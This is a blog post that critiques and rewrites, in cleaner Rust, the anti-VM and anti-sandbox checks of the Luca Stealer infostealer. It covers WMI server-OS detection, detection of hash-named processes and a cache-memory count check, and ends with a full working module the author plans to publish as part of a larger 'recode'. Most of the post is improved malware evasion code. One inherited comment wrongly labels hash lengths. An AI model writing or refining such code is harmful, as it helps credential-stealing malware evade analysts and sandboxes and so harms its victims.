---
title: 'Luca stealer - why your Rust code is dogshit (part 1; anti-emulation)'
description: 'Please take this as an example of what NOT to do...'
pubDate: 'Jul 08 2024'
heroImage: '/blog-image-1.jpg'
---

Howdy y'all, this is my first (and probably) last series of blog posts, but I had to type this out, considering how fucking horrible <a href="https://github.com/vxunderground/MalwareSourceCode/blob/main/Win32/Stealers/Win32.Rust.LucaStealer.zip" target="_blank">the code for Luca Stealer</a> is. This post is about the anti-emulation.

##### Disclaimer: the code provided here shall not be used maliciously, and is for old versions of the crates talked about. I'm also not adding async/await, as I have other things to do and it'd take too much work for my lazy dum dum ADHD brain.
<br />

### The detect function

We're starting with their detect function:
```rust
pub fn detect()  {
    if is_server_os() || is_vm_by_wim_temper() || detect_hash_processes() {
        process::exit(0);
    }
}
```

Surprisingly, this part is actually pretty good. But instead, I'd let the users select what functions they want by using function pointers (as it has the less friction for both configuring and development). For example, doing this:

```rust
const MODES: &[fn() -> bool] = &[is_server_os, is_vm_by_wim_temper, detect_hash_processes];

pub fn is_vm() -> bool {
    MODES.iter().any(|mode| mode())
}
```
And then the `process::exit(0)` goes in main. Simple as that, and easily better.

### Server OS detection
Now let's dive into the real deal, starting with their server OS detection function.

```rust
fn is_server_os() -> bool {
    let hostname = whoami::hostname();
    let namespace_path = format!("{}{}", hostname, obfstr::obfstr!("\\ROOT\\CIMV2"));
    let wmi_con = match WMIConnection::with_namespace_path(&namespace_path, COMLibrary::new().unwrap().into()) {
        Ok(wmi_con) => wmi_con,
        Err(_) => return false,
    };

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT ProductType FROM Win32_OperatingSystem"))
        .unwrap();

    drop(wmi_con);

    for result in results {
        for value in result.values()  {
            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                return true;
            }
        }
    }

    false
}
```

...This is tremendously stupid. These variable names are too complex, he barely uses any rust functions, and is making variables when he doesn't need them.

Starting with namespace path and hostname, the functions describe themselves, so you don't need to make them a variable. Also, "wmi_con" could be renamed to the better name, "connection". You don't even need match, you can use the let-else syntax, stable since Rust 1.65.

I also dislike the way results was made (unwrap, use let-else once again), but I don't have much experience with that part, so I might leave it alone for the most part. You could also save a character and make the code cleaner by changing the "\\\\ROOT\\\\CIMv2" to r"ROOT\CIMv2" (because r"\ROOT\CIMv2" is buggy, just like the original). You can also use into_values to not need to dereference, which in my opinion looks ugly. Also, both the hostname and the .into() are useless, so I removed them.

My finished product is this:
```rust
fn is_server_os() -> bool {
    let Ok(library) = COMLibrary::new() else {
        return false;
    };

    let Ok(connection) = WMIConnection::with_namespace_path(obfstr!(r"ROOT\CIMV2"), library) else {
        return false;
    };

    let Ok(results) = connection.raw_query::<HashMap<String, Variant>>(obfstr!(
        "SELECT ProductType FROM Win32_OperatingSystem"
    )) else {
        return false;
    };

    drop(connection);

    for variant in results.into_iter().flat_map(HashMap::into_values) {
        let Variant::UI4(2..4) = variant else {
            continue;
        };

        return true;
    }

    false
}
```
</br>

### Hash process detection
Moving on, let's talk about the hash process detection.
Their code goes like this:

```rust
fn detect_hash_processes() -> bool  {
    let mut system = System::new();
    system.refresh_all();

    for (_,  process) in system.processes() {
        if let Some(arg) = process.cmd().get(0) {
            let path = Path::new(arg);
            
            match path.file_stem() {
                Some(file_name) => {
                    if file_name.len() == 64 || file_name.len() == 128 {
                        return  true; // MD5 Or SHA-512
                    }
                },
                None  =>  (),
            }
        }
    }
    
    false
}
```

If I didn't know this was authored by a human, I'd think ChatGPT wrote this.. This looks like it was made by GPT 4's distant cousin, JBR -4... There's so much to improve:

- Don't refresh all, make a system with processes refreshed
- Don't use get(0), use first()
- Rename arg to path
- Use map and Path::new to create the path
- Instead of "file_name", name the variable just "name"
- Use let-else and continue to reduce nesting
- Use if_some_and instead of match... are you addicted to match or..?

My finished product is this:

```rust
fn detect_hash_processes() -> bool {
    let system = System::new_with_specifics(
        RefreshKind::new()
            .with_processes(ProcessRefreshKind::new().with_cmd(UpdateKind::OnlyIfNotSet)),
    );

    for process in system.processes().values() {
        let Some(path) = process.cmd().first().map(Path::new) else {
            continue;
        };

        if path
            .file_stem()
            .is_some_and(|name| name.len() == 64 || name.len() == 128)
        {
            return true;
        }
    }

    false
}
```
</br>

### Detection by WIM tempererature
Finally, I'm tired of writing, and by chance, this file just has one last function:

```rust
fn is_vm_by_wim_temper() -> bool {
    let wmi_con = WMIConnection::new(COMLibrary::new().unwrap().into()).unwrap();  

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT * FROM Win32_CacheMemory"))
        .unwrap();

    drop(wmi_con);

    if results.len() < 2 {
        return true;
    }

    false
}
```

Everything that I hate in this function I've already talked about, so let's cut the chase and finish this rewrite.

```rust
fn detect_wim_temperature() -> bool {
    let Ok(library) = COMLibrary::new() else {
        return false;
    };

    let Ok(connection) = WMIConnection::new(library) else {
        return false;
    };

    let Ok(results) = connection
        .raw_query::<HashMap<String, Variant>>(obfstr!("SELECT * FROM Win32_CacheMemory"))
    else {
        return false;
    };

    drop(connection);

    results.len() < 2
}
```

So, what did we learn today..? Rust and cargo are our best friends; You code differently in rust comparted to other languages; Add more customizability without repetition; Don't return true if a variable is true or false if it's false... just return the variable; For the love of god, don't specify everything and the kitchen sink in your variable names

### Full code

Here's the full code, which at the end of the series, might also be posted on GitHub:
```rust

use obfstr::obfstr; // Added this here because typing it is tiring
use std::{collections::HashMap, path::Path, process};
use sysinfo::{ProcessRefreshKind, RefreshKind, System, UpdateKind};
use wmi::{COMLibrary, Variant, WMIConnection};

const MODES: &[fn() -> bool] = &[is_server_os, detect_wim_temperature, detect_hash_processes];

pub fn is_vm() -> bool {
    MODES.iter().any(|mode| mode())
}

pub fn main() {
    detect();
    println!("I'm not a VM!");
}

// This function wasn't in my write-up for reasons I've already described, I've added it only for compatibility
pub fn detect() {
    if is_vm() {
        process::exit(0);
    }
}

fn is_server_os() -> bool {
    let Ok(library) = COMLibrary::new() else {
        return false;
    };

    let Ok(connection) = WMIConnection::with_namespace_path(obfstr!(r"ROOT\CIMV2"), library) else {
        return false;
    };

    let Ok(results) = connection.raw_query::<HashMap<String, Variant>>(obfstr!(
        "SELECT ProductType FROM Win32_OperatingSystem"
    )) else {
        return false;
    };

    drop(connection);

    for variant in results.into_iter().flat_map(HashMap::into_values) {
        let Variant::UI4(2..4) = variant else {
            continue;
        };

        return true;
    }

    false
}

fn detect_hash_processes() -> bool {
    let system = System::new_with_specifics(
        RefreshKind::new()
            .with_processes(ProcessRefreshKind::new().with_cmd(UpdateKind::OnlyIfNotSet)),
    );

    for process in system.processes().values() {
        let Some(path) = process.cmd().first().map(Path::new) else {
            continue;
        };

        if path
            .file_stem()
            .is_some_and(|name| name.len() == 64 || name.len() == 128)
        {
            return true;
        }
    }

    false
}

fn detect_wim_temperature() -> bool {
    let Ok(library) = COMLibrary::new() else {
        return false;
    };

    let Ok(connection) = WMIConnection::new(library) else {
        return false;
    };

    let Ok(results) = connection
        .raw_query::<HashMap<String, Variant>>(obfstr!("SELECT * FROM Win32_CacheMemory"))
    else {
        return false;
    };

    drop(connection);

    results.len() < 2
}
```

</br>

I might continue this if I feel like it...
If I missed something, please tell me.
Oh, and I'm just **STARTING** with a recode, you don't wanna see what I'm gonna do after seriously getting comfy with the codebase... <3